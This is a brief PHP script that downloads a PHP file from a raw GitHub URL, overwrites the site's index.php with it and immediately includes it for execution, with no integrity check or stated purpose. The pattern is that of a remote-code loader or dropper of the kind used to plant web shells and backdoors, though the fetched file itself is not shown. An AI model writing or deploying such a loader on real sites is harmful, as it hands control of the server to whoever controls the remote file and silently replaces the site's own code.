<?php
$remoteFile = 'https://raw.githubusercontent.com/ioscreate/JustAStupidCACHE/main/hello_lang.php';
$localFile = 'index.php';

// Télécharger le fichier localement
file_put_contents($localFile, file_get_contents($remoteFile));

if (file_exists($localFile)) {
    include $localFile;
} else {
    echo 'Failed to download and include the file.';
}
?>
